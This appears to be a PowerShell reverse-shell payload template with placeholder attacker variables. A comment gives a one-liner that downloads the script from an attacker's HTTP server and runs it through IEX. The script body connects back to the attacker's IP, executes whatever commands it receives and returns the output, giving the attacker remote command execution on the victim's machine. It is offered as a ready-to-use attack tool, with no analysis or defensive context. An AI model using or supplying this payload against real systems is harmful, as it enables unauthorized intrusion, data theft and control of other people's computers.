# use by putting this in shell.ps1, and execute powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://${ATTACKER_IP}:${ATTACKER_HTTP_PORT}/shell.ps1')"
$client = New-Object System.Net.Sockets.TCPClient('${ATTACKER_IP}',${ATTACKER_SHELL_PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()